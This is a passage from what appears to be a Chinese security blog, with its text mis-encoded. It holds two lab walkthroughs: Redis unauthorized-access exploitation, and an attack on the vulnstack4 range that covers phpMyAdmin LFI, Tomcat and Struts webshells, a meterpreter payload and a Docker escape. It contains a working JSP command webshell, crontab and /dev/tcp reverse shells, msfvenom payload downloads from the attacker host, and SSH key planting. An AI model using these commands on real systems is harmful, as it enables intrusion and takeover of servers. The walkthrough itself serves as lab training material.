    <url>/posts/19a78c2/</url>
    <content><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ï¼Œæ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œã€‚</p>
<p>å½±å“ç‰ˆæœ¬ï¼šRedis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.xã€‚ä½†æ˜¯åœ¨Redis3.2ä¹‹åå¢åŠ äº†<strong>protected-mode</strong>å®‰å…¨æ¨¡å¼ï¼Œé»˜è®¤å¼€å¯ï¼Œä¸”ç»‘å®šäº†æœ¬åœ°IP</p>
<p>æ‰€ä»¥æƒ³è¦å¤ç°éœ€è¦æ›´æ”¹é…ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bind 127.0.0.1 &#x3D;&gt; bind 0.0.0.0  &#x2F;&#x2F;å¼€å¯è¿œç¨‹è®¿é—®</span><br><span class="line">protected-mode yes &#x3D;&gt; protested-mode no</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ–¹ä¾¿é€‰æ‹©ä½¿ç”¨3.2ç‰ˆæœ¬ä¹‹å‰çš„Redisï¼šRedis-2.8.17ï¼Œä¸éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶å³å¯å¤ç°</p>
<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>centos7 ï¼ˆ192.168.0.182ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ä¸‹è½½redis-2.8.17</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line"></span><br><span class="line"># è§£å‹å‹ç¼©åŒ… ç¼–è¯‘å®‰è£…</span><br><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">cd redis-2.8.17</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"># redis.confæ‹·è´åˆ°&#x2F;etcä¸‹é¢</span><br><span class="line">cp redis.conf &#x2F;etc&#x2F;redis.conf</span><br><span class="line"></span><br><span class="line"># å°†redis-serverå’Œredis-cliæ‹·è´åˆ°&#x2F;usr&#x2F;binç›®å½•ä¸‹ï¼Œæ–¹ä¾¿ç›´æ¥å¯åŠ¨redisæœåŠ¡å™¨</span><br><span class="line">cd src</span><br><span class="line">cp redis-server &#x2F;usr&#x2F;bin</span><br><span class="line">cp redis-cli &#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨æœåŠ¡</span><br><span class="line">redis-server &#x2F;etc&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ç”±äºæ˜¯åœ¨æœ¬åœ°æ­å»ºçš„ï¼Œæ²¡æœ‰å¼€å¯6379ç«¯å£å¯¹å¤–å¼€æ”¾ï¼Œæ‰€æœ‰å…ˆåœ¨centosä¸Šå…ˆå…³é—­é˜²ç«å¢™ </span><br><span class="line">systemctl stop firewalld.service</span><br><span class="line">systemctl disable firewalld.service</span><br><span class="line">systemctl status firewalld.service</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>ä½¿ç”¨kaliè¿œç¨‹è¿æ¥redis</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli -h 192.168.163.132</span><br></pre></td></tr></table></figure>

<h4 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h4><p>æ¡ä»¶</p>
<ul>
<li>æˆåŠŸè¿æ¥redisæœåŠ¡å™¨</li>
<li>çŸ¥é“webæ ¹ç›®å½•çš„ç»å¯¹è·¯å¾„</li>
<li>redisæœåŠ¡å™¨ç”¨æˆ·æœ‰å†™å…¥æƒé™</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">192.168.0.182:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="/posts/19a78c2/shell.png"></p>
<h4 id="å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥"><a href="#å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥" class="headerlink" title="å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥"></a>å†™å…¥sshå…¬é’¥è¿œç¨‹è¿æ¥</h4><p>1.kali æœ¬åœ°ç”Ÿæˆsshå…¬é’¥</p>
<p><code>ssh-keygen -t rsa</code></p>
<p>2.è¿›å…¥.sshç›®å½•ï¼Œå°†å…¬é’¥å†™å…¥1.txt</p>
<p><code>cd /root/.ssh</code></p>
<p><code>(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; 1.txt</code></p>
<p><img src="/posts/19a78c2/1_txt.png"></p>
<p>3.å°†1.txtå†™å…¥é¶æœº</p>
<p><code> cat 1.txt | redis-cli -h 192.168.0.182 -x set crack</code></p>
<p>4.è¿œç¨‹ç™»å½•é¶æœºredisæœåŠ¡</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>5.æ›´æ”¹rediså¤‡ä»½è·¯å¾„ä¸ºsshå…¬é’¥å­˜æ”¾ç›®å½•ï¼ˆä¸€èˆ¬é»˜è®¤ä¸º/root/.sshï¼‰,è®¾ç½®ä¸Šä¼ å…¬é’¥çš„å¤‡ä»½æ–‡ä»¶åå­—ä¸ºauthorized_keysï¼Œsaveä¿å­˜</p>
<p><code>CONFIG GET dir</code></p>
<p><code>config set dir /root/.ssh</code> </p>
<p><code>CONFIG SET dbfilename authorized_keys</code></p>
<p><code>CONFIG GET dbfilename</code> æ£€æŸ¥æ˜¯å¦æœ‰authorized_keysæ–‡ä»¶</p>
<p><code>save</code></p>
<p><img src="/posts/19a78c2/save_file.png"></p>
<p>6.sshè¿æ¥é¶æœº</p>
<p><code>ssh -i id_rsa root@192.168.0.182</code></p>
<p>ç™»å½•æˆåŠŸ</p>
<p><img src="/posts/19a78c2/ssh_conn.png"></p>
<h4 id="åˆ©ç”¨crontabåå¼¹shell"><a href="#åˆ©ç”¨crontabåå¼¹shell" class="headerlink" title="åˆ©ç”¨crontabåå¼¹shell"></a>åˆ©ç”¨crontabåå¼¹shell</h4><p>kaliä½¿ç”¨ncç›‘å¬ç«¯å£</p>
<p><code>nc -lvvp 5555</code></p>
<p>kaliè¿æ¥redisæœåŠ¡</p>
<p><code>redis-cli -h 192.168.0.182</code></p>
<p>å‘æœåŠ¡å™¨å†™å…¥æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.0.128&#x2F;5555 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹nc æ˜¯å¦åå¼¹åˆ°shell</p>
<p><img src="/posts/19a78c2/nc_shell.png"></p>
<h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><ul>
<li><p>ç¦ç”¨é«˜å±å‘½ä»¤ï¼Œå¦‚è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</p>
</li>
<li><p>é€‰æ‹©ä½¿ç”¨åœ°æƒé™è¿è¡ŒredisæœåŠ¡ï¼Œä¸”ç¦æ­¢è¿œç¨‹ç™»å½•</p>
</li>
<li><p>è®¾ç½®RedisæœåŠ¡å¯†ç ï¼Œæˆ–æ˜¯ç»‘å®šæœ¬åœ°IPï¼š127.0.0.1</p>
</li>
</ul>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2090">www.feidao.site/wordpress/?p=2090</a></p>
<p><a href="https://www.freebuf.com/vuls/248207.html">https://www.freebuf.com/vuls/248207.html</a></p>
<p><a href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></p>
<p><a href="https://www.yyxzz.net/articles/36.html">https://www.yyxzz.net/articles/36.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack4é¶åœº</title>
    <url>/posts/e94e95f1/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">å¤–ç½‘ä½¿ç”¨NATæ¨¡å¼  å†…ç½‘ä½¿ç”¨VM3 192.168.181.0&#x2F;24</span><br><span class="line">Ubuntu(ubuntu)      192.168.183.129     192.168.0.180 </span><br><span class="line">DC(Dotest123)       192.168.183.130</span><br><span class="line">Win7(Test2021)      192.168.183.128</span><br></pre></td></tr></table></figure>

<p>å¼€å¯webæœºå™¨(ubuntu)çš„dokcerå®¹å™¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;struts2&#x2F;s2-045</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;tomcat&#x2F;CVE-2017-12615&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line">cd &#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;phpmyadmin&#x2F;CVE-2018-12613&#x2F;</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">sudo docker ps  </span><br></pre></td></tr></table></figure>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><code>sudo nmap 192.168.0.180 -sT -Pn -sV </code></p>
<p><img src="/posts/e94e95f1/namp.png"></p>
<p>å¼€æ”¾äº† 22 2001 2002 2003 ç«¯å£</p>
<p>åˆ†åˆ«è®¿é—®äº†ä¸‹2001ï¼Œ2002ï¼Œ2003ç«¯å£</p>
<p>2001    structs2</p>
<p>2002    tomcat</p>
<p>2003    phpmyadmin4.8.1</p>
<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="phpmyadmin-CVE-2018-12613"><a href="#phpmyadmin-CVE-2018-12613" class="headerlink" title="phpmyadmin CVE-2018-12613"></a>phpmyadmin CVE-2018-12613</h4><p>çœ‹äº†ä¸‹phpmyadminçš„ç‰ˆæœ¬ æ˜¯4.8.1 å…ˆéªŒè¯ä¸‹æ˜¯å¦å­˜åœ¨cve-2018-12613</p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code> ç›´æ¥è¿è¡Œäº†/etc/passwd è¯´æ˜å­˜åœ¨è¯¥æ¼æ´</p>
<p><img src="/posts/e94e95f1/phpmyadmin1.png"></p>
<p>ç„¶åå°è¯•getshell</p>
<p>åœ¨sqlå¤„ æ‰§è¡Œ <code>select &#39;&lt;?php phpinfo();?&gt;&#39;</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin2.png"></p>
<p>æ‰§è¡ŒæˆåŠŸåæŸ¥çœ‹ è‡ªå·±çš„sessionid  phpmyadminçš„å€¼ <code>2c8e2d642e3762699d4e070db30880b6</code></p>
<p><img src="/posts/e94e95f1/phpmyadmin_value.png"></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_2c8e2d642e3762699d4e070db30880b6</code></p>
<p><code>http://192.168.0.128:2003/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_7f9c04b6ead4e844459d4ec29658e424</code></p>
<p>æˆåŠŸæ‰§è¡Œä¹‹å‰åœ¨sqlå¤„çš„phpinfoå‘½ä»¤</p>
<p><img src="/posts/e94e95f1/phpmyadmin_phpinfo.png"></p>
<p>å†™å…¥ä¸€å¥è¯</p>
<p>å°è¯•å‡ ä¸ªä¸€å¥è¯éƒ½å†™å…¥å¤±è´¥äº†ï¼Œå†™å…¥åä¼šæŠ¥é”™ï¼Œå¯èƒ½æ˜¯å› ä¸ºdockerçš„åŸå› </p>
<p><img src="/posts/e94e95f1/phpmyadmin_shell_error.png"></p>
<h4 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h4><p><img src="/posts/e94e95f1/struts2_1.png"></p>
<p><img src="/posts/e94e95f1/struts2_2.PNG"></p>
<p>å¯ä»¥åˆ¤æ–­æ˜¯dockerå®¹å™¨</p>
<p>ä¸Šä¼ jsp shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;HTML&gt;&lt;BODY&gt;</span><br><span class="line"> &lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;</span><br><span class="line"> &lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;</span><br><span class="line"> &lt;&#x2F;FORM&gt;</span><br><span class="line"> &lt;pre&gt;</span><br><span class="line"> &lt;%</span><br><span class="line"> if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;</span><br><span class="line">    </span><br><span class="line">         out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&gt;&quot;);</span><br><span class="line">         Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));</span><br><span class="line">         OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">         InputStream in &#x3D; p.getInputStream();</span><br><span class="line">         DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">         String disr &#x3D; dis.readLine();</span><br><span class="line">         while ( disr !&#x3D; null ) &#123;</span><br><span class="line">    </span><br><span class="line">                 out.println(disr); disr &#x3D; dis.readLine(); &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> %&gt;</span><br><span class="line"> &lt;&#x2F;pre&gt;</span><br><span class="line"> &lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/struts2_shell.png"></p>
<h4 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h4><p>ä½¿ç”¨kaliçš„searchsploitæœç´¢tomcatçš„pocï¼Œè¿™é‡Œtomcatç‰ˆæœ¬æ˜¯8.5</p>
<p><code>searchsploit tomcat 8.5.19</code></p>
<p><img src="/posts/e94e95f1/searchsploit_tomcat.png"></p>
<p><code>searchsploit -m jsp/webapps/42966.py</code></p>
<p><code>sudo python2 42966.py -u http://192.168.0.180:2002</code></p>
<p><code>sudo python2 42966.pu -u http://192.168.0.180:2002 -p pwn</code></p>
<p>è®¿é—®<code>http://192.168.0.180:2002/pwn.jsp</code></p>
<p><img src="/posts/e94e95f1/tomcat_shell_whoami.png"></p>
<p>åˆ¤æ–­æ˜¯dockerç¯å¢ƒ<code>ls -alh /.dockerenv</code>  <code>cat /proc/1/cgroup</code></p>
<h4 id="ä¸Šçº¿msf"><a href="#ä¸Šçº¿msf" class="headerlink" title="ä¸Šçº¿msf"></a>ä¸Šçº¿msf</h4><p>ç”Ÿæˆmsfé©¬</p>
<p><code> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>kaliå¼€å¯httpæœåŠ¡</p>
<p><code>sudo python3 -mhttp.server 9999</code></p>
<p>åœ¨ä¸Šä¼ çš„pwn.jspé€šè¿‡wgetä¸‹è½½msf</p>
<p><code>wget http://192.168.0.128:9999/shell.elf</code></p>
<p><code>chmod 777 shell.elf</code></p>
<p><code>./shell.elf</code></p>
<p>msfå¼€å¯ç›‘å¬</p>
<p><code>use exploit/multi/handler</code></p>
<p><code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p><code>set lhost 192.168.0.128</code></p>
<p><code>set lport 4444</code></p>
<p><code>run</code></p>
<p>æˆåŠŸåå¼¹åˆ°shell</p>
<p><img src="/posts/e94e95f1/msf_shell.png"></p>
<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><h4 id="åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸"><a href="#åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸" class="headerlink" title="åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸"></a>åˆ©ç”¨CVE-2019-5736è¿›è¡Œdockeré€ƒé€¸</h4><p>payloadä¸‹è½½åœ°å€ <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>ä¸‹è½½å¹¶ç¼–è¯‘main,go ä¿®æ”¹payloadæ›¿æ¢ä¸ºåå¼¹shell </p>
<p><code>var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/192.168.0.128/5555 0&gt;&amp; 1&quot;</code></p>
<p>ç¼–è¯‘ç”Ÿæˆgoæ–‡ä»¶</p>
<p><code> CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></p>
<p>é€šè¿‡msfå°†ç”Ÿæˆçš„main.goä¸Šä¼ åˆ°é¶æœº</p>
<p><code>upload ~/æ¡Œé¢/CVE-2019-5736-PoC /home</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;home </span><br><span class="line">chmod &#x2F;main</span><br><span class="line">cd &#x2F;main</span><br><span class="line">.&#x2F;main.go</span><br></pre></td></tr></table></figure>

<p>åœ¨æ‰§è¡Œå‰å…ˆåœ¨kaliä¸Šå¼€å¯ç›‘å¬</p>
<p><code>nc -lvvp 5555</code></p>
<p>ä½†æ˜¯ç”±äºéœ€è¦å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤ æ‰èƒ½å»è§¦å‘payloadåå¼¹shell</p>
<p>è¿è¡Œå®Œä¹‹å msfè¿›å…¥shellå°±ä¼šå¡ä½â€¦æ‰€ä»¥å°±æ¢ä¸€ç§æ–¹æ³• å¯ä»¥ä½¿ç”¨â€“privilegedï¼ˆç‰¹æƒæ¨¡å¼ï¼‰è¿›è¡Œé€ƒé€¸</p>
<h4 id="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"><a href="#åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸" class="headerlink" title="åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸"></a>åˆ©ç”¨â€“privilegedç‰¹æƒæ¨¡å¼é€ƒé€¸</h4><p>ä½¿ç”¨ç‰¹æƒæ¨¡å¼å‘å®¿ä¸»æœºçš„ç¡¬ç›˜ä¸­å†™å…¥sshç§é’¥ï¼Œå®ç°sshå…å¯†ç™»å½•å®¿ä¸»æœº</p>
<p>1.æŸ¥çœ‹ç£ç›˜æ–‡ä»¶ <code>fdisk -l</code></p>
<p><img src="/posts/e94e95f1/docker_fdisk.png"></p>
<p>2.æŸ¥çœ‹è®¾å¤‡æ–‡ä»¶ <code>ls /dev</code></p>
<p>3.æ–°å»ºç›®å½•è¿›è¡ŒæŒ‚è½½      <code>mkdir /test</code></p>
<p>4.å°†/dev/sda1æŒ‚è½½åˆ°/testç›®å½•ä¸­  <code>mount /dev/sda1 /test</code></p>
<p>5.æŸ¥çœ‹æ˜¯å¦æŒ‚è½½æˆåŠŸ <code>ls /test</code></p>
<p><img src="/posts/e94e95f1/mount_test.png"></p>
<p>6.åœ¨kaliæœ¬åœ°ä¸Šç”Ÿæˆsshå¯†é’¥ <code>ssh-keygen -f test</code> ï¼Œç„¶åä¼šç”Ÿæˆ<code>test</code> <code>test.pub</code></p>
<p>èµ‹äºˆ600æƒé™<code>chmod 600 test</code></p>
<p>7.å°†ç”Ÿæˆçš„å¯†é’¥å†™å…¥åˆ°ç›®æ ‡æœºå™¨ä¸­</p>
<p>ç”±äºå‰é¢å°† <code>sda1</code>æŒ‚è½½åˆ°äº†<code>/test</code> æ‰€ä»¥è®¿é—®/test/homeä¹Ÿå°±ç­‰åŒäºå»è®¿é—®å®¿ä¸»æœºçš„/homeç›®å½•</p>
<p><code>ls /test/home</code></p>
<p><img src="/posts/e94e95f1/ls_test_home.png"></p>
<p>æŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶<code>ls -alh /test/home/ubuntu</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu.png"></p>
<p>æŸ¥çœ‹.sshæ–‡ä»¶ <code>ls -alh /test/home/ubuntu/.ssh/</code></p>
<p><img src="/posts/e94e95f1/ls_test_home_ubuntu_ssh.png"></p>
<p><code>cp -avx /test/home/ubuntu/.ssh/id_rsa.pub /test/home/ubuntu/.ssh/authorized_keys</code> # -avxå°†æƒé™ä¹Ÿä¸€èµ·èµ‹äºˆ</p>
<p><img src="/posts/e94e95f1/cp_key.png"></p>
<p><code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><code>cat test.pub</code> </p>
<p><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020</code></p>
<br>

<p><code>echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1/QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo/mh+Upm+oqqvlkX/1PYvsUkXOpLBm/Oy/ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq/o95qGkKaMdPkHWfiDiag2B+BFS/Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K/Bg3rSlUPD6ibogfIQMTR1Vint2gs= kali@kali2020&#39; &gt;&gt; /test/home/ubuntu/.ssh/authorized_keys    </code># å°†sshç§˜é’¥å†™å…¥authorized_keysæ–‡ä»¶</p>
<p><img src="/posts/e94e95f1/echo_ssh_rsa.png"></p>
<p>æŸ¥çœ‹æ˜¯å¦å†™å…¥æˆåŠŸï¼Œå‘ç°è¿˜æ˜¯æ²¡æˆåŠŸï¼Œä½¿ç”¨<code>echo &gt; /test/home/ubuntu/.ssh/authorized_keys </code>æ— æ³•æ¸…é™¤åŸæœ‰çš„å€¼ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰å†™å…¥æƒé™</p>
<p><code> cat /test/home/ubuntu/.ssh/authorized_keys</code></p>
<p><img src="/posts/e94e95f1/cat_ssh_rsa.png"></p>
<p>å°è¯•å»ä¸Šä¼ ä¸€ä¸ªkey.shï¼Œå†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -avx &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf0H1&#x2F;QT12pdJ04TXtsJ8C4n0CCa6l4G4MUpImanHscGsXHz8izRwWoPMuRMwSgnOC1ItEWLCvR1UGxR7VdlBlafxoan9e2nIDtGDth5w4h2aR4ac+HVTZL5mHCcx7frWqZ4sGgeX6SHswNmRqGTS8oleMULqhOvkQlA81ML0mwTgUIKTM4QNBCaB2pyC96LD6OPuO2ofzGbyjEqGuPxpI0dIHxJsL5DvwfKHYSmkuLJA65k0RRHAZrSdBE95NPqrzhgT+u33MTauhmCa2b8+mgX83AOo&#x2F;mh+Upm+oqqvlkX&#x2F;1PYvsUkXOpLBm&#x2F;Oy&#x2F;ZCWF2aTO+GbHmN2aQK766iChVl0ja04mNnmsaGiUl6MOxqqZ9jqZODpprkfatPuJrzq2Fan4ERlFO3Y7eq&#x2F;o95qGkKaMdPkHWfiDiag2B+BFS&#x2F;Xsvr9lKg17xcBG411aAuIhxWQJMHJHjdiM6as8kNbp+JBwU3Kr1M4i3K&#x2F;Bg3rSlUPD6ibogfIQMTR1Vint2gs&#x3D; kali@kali2020&#39; &gt; &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">cat &#x2F;test&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure>

<p>å¼€å¯httpæœåŠ¡ä½¿ç”¨é¶æœºä¸‹è½½</p>
<p><code>sudo python3 -m http.server 9999</code></p>
<p><code>wget http://192.168.0.128:9999</code></p>
<p><code>chmod 777 key.sh</code></p>
<p><code>./key.sh</code></p>
<p>è¿˜æ˜¯å†™å…¥å¤±è´¥äº†ï¼Œçœ‹äº†ä¸‹å¸ˆå‚…ä»¬ä¹Ÿæ˜¯è¿™æ ·åšçš„æ²¡å•¥é—®é¢˜ï¼Œç„¶åæˆ‘å°±å»ubuntué¶æœºä¸Šè¯•äº†ä¸‹å‘ç°ä¹Ÿæ²¡æ³•ä½¿ç”¨echoå†™å…¥ï¼Œåªèƒ½é€šè¿‡<code>sudo vim authorized_keys</code>æ‰‹åŠ¨å°†åœ¨kaliä¸Šç”Ÿæˆçš„å¯†é’¥å¤åˆ¶è¿›å»ï¼Œæ‰èƒ½åœ¨kaliä¸Šå…å¯†ç™»å½•</p>
<p><code>ssh -i test ubuntu@192.168.0.181</code></p>
<p><img src="/posts/e94e95f1/ssh_test_ubuntu.png"></p>
